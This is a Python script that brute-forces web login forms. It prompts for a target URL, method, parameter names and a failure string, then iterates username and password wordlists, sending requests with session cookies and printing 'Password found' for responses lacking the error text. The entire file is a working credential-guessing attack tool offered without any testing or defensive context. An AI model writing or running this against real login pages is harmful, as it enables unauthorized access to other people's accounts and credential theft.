import requests as rq
import os

def attack(list,val,meth,cooks,err):
	param_list = list
	vals = val
	method = meth
	cookies = cooks
	error = str(err)
	print(param_list)
	print(vals)

	if(os.path.isfile(vals[0]) and os.path.isfile(vals[1])):
		param1_val = open(vals[0],'r').readlines()
		param2_val = open(vals[1],'r').readlines()
		for param1 in param1_val:
			parval1 = param1.strip()
			for param2 in param2_val:
				parval2 = param2.strip()
				if(method=="GET" or method=="get"):
					res = rq.get(url,data={param_list[0]:parval1,param_list[1]:parval2},cookies=cookies)
				elif(method=="POST" or method=="post"):
					res = rq.post(url,data={param_list[0]:parval1,param_list[1]:parval2},cookies=cookies)
				cont = str(res.content)
				if error in cont:
	 		   		print("failed:",parval1,parval2,"\t Status code:",res.status_code,"\t length:",res.headers.get('content-length'))
				else:
			  		print("Password found:",parval1,parval2,"\t Status code:",res.status_code,"\t length:",res.headers.get('content-length'))
		print("Execution over")

	elif(not os.path.isfile(vals[1])):
		param1_val = open(vals[0],'r').readlines()
		for param1 in param1_val:
			parval1 = param1.strip()
			parval2 = vals[1]
			if(method=="GET" or method=="get"):
				res = rq.get(url,data={param_list[0]:parval1,param_list[1]:parval2},cookies=cookies)
			elif(method=="POST" or method=="post"):
				res = rq.post(url,data={param_list[0]:parval1,param_list[1]:parval2},cookies=cookies)
			cont = str(res.content)
			if error in cont:
				print("failed:",parval1,parval2,"\t Status code:",res.status_code,"\t length:",res.headers.get('content-length'))
			else:
				print("Password found:",parval1,parval2,"\t Status code:",res.status_code,"\t length:",res.headers.get('content-length'))
		print("Execution over")

	elif(not os.path.isfile(vals[0])):
		param2_val = open(vals[1],'r').readlines()
		for param2 in param2_val:
			parval2 = param2.strip()
			parval1 = vals[0]
			if(method=="GET" or method=="get"):
				res = rq.get(url,data={param_list[0]:parval1,param_list[1]:parval2},cookies=cookies)
			elif(method=="POST" or method=="post"):
				res = rq.post(url,data={param_list[0]:parval1,param_list[1]:parval2},cookies=cookies)
			cont = str(res.content)
			if error in cont:
				print("failed",parval1,parval2,"\t Status code:",res.status_code,"\t length:",res.headers.get('content-length'))
			else:
				print("Password found:",parval1,parval2,"\t Status code:",res.status_code,"\t length:",res.headers.get('content-length'))
		print("Execution over")

url = input("Enter url:")
method = input("Enter method[GET/POST]:")
print("First two parameters should be username and password parameters...")
params = input("Enter parameters:")
param_list = params.split(',')
choice = 1
count = 0
val = []
cookie = rq.Session()
res = cookie.get(url)
err = input("Enter error:")
cookies = res.cookies.get_dict()

for param in param_list:
   if count<2:
     print("Enter any string or wordlist path for",param,":")
   else:
     print("Enter any string value for",param,":")
   count+=1
   choice = input()
   val.append(choice)

attack(param_list,val,method,cookies,err)
